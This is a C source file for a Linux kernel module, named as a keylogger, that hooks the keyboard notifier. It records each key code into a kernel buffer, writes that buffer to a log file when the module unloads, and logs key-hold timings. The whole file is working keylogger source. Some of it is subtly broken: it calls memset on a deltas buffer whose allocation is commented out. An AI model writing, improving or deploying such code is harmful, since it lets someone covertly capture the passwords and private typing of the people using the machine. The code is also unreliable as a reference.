#ifndef __KERNEL__
#define __KERNEL__
#endif
#ifndef MODULE
#define MODULE
#endif

#include "keylogger.h"

int flag;

int * buffer;
int * buffer_ptr;
int * buffer_endptr;
long buf_length;

unsigned int * deltas;
unsigned int * deltas_ptr;
unsigned int * deltas_endptr;
long deltas_length;

int shift_pressed = 0;

struct file * fp;
struct timespec ts_up;
struct timespec ts_down;
mm_segment_t fs;
loff_t pos;



static const char* keymap[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
                        "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
                        "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
                        "/", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};

static const char* keymap_shift[] =
                        { "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "_BACKSPACE_", "_TAB_",
                        "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "_ENTER_", "_CTRL_", "A", "S", "D", "F",
                        "G", "H", "J", "K", "L", ":", "\"", "~", "_SHIFT_", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">",
                        "?", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};


int keylogger_init(void) {
    buf_length = LOG_MAX_SIZE;
    buffer = kmalloc(buf_length, GFP_KERNEL);
    buffer_ptr = buffer;
    buffer_endptr = buffer + buf_length;

    //deltas_length = LOG_MAX_SIZE * 2;
    //deltas = kmalloc(deltas_length, GFP_KERNEL);
    //deltas_ptr = deltas;
    //deltas_endptr = deltas + deltas_length;
    
    register_keyboard_notifier(&nb);
    memset(buffer, 0, buf_length);
	memset(deltas, 0, deltas_length);
    
    return 0;
}

void keylogger_exit(void) {
    unregister_keyboard_notifier(&nb);
    save_buffer();
    memset(buffer, 0, buf_length);
    kfree(buffer);
    buffer_ptr = buffer;
    flag = 0;
}

int save_buffer()
{
    fp = filp_open(LOG_FILE_PATH, O_RDWR | O_CREAT | O_APPEND, 0600);
    if (IS_ERR(fp)) {
        return -1;
    }
    pos = 0;
    fs = get_fs();
    set_fs(KERNEL_DS);
    vfs_write(fp, (const char *)buffer, (buffer_ptr-buffer)*sizeof(int), &pos);
    vfs_fsync(fp, 0);
    filp_close(fp, NULL);
    set_fs(fs);
    return 0;
}

int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* _param) {
    struct keyboard_notifier_param *param = _param;  

    if(flag)
        return NOTIFY_OK;

    if (code == KBD_KEYCODE && (param->value==42 || param->value==54)){
		shift_pressed = param->down ? 1 : 0;

    }else if(code == KBD_KEYCODE && param->down) {

	//const char *key_char = !shift_pressed ? keymap[param->value] : keymap_shift[param->value];
    	int key = param->value;

		getnstimeofday(&ts_down);

        *buffer_ptr = key;
        buffer_ptr++;

        if(buffer_ptr == buffer_endptr)
            flag = 1;
	
	//printk(KERN_ERR  "KEYLOGGER %i down  %s", param->value, key_char);
    }else if(code == KBD_KEYCODE && !param->down) {
    	unsigned int d; //milliseconds

		getnstimeofday(&ts_up);
	
		if(ts_up.tv_sec == ts_down.tv_sec) {
			d = 0;
		}else{
			d = 60000;
		}

		if(ts_up.tv_nsec > ts_down.tv_nsec){
			d += (ts_up.tv_nsec - ts_down.tv_nsec)/1000000;
		}else{
			d += (ts_down.tv_nsec - ts_up.tv_nsec)/1000000;	    
		}
		
		printk(KERN_ERR  "KEYLOGGER delta %u", d);	
    }
    return NOTIFY_OK;
}

MODULE_LICENSE("GPL");
module_init(keylogger_init);
module_exit(keylogger_exit);
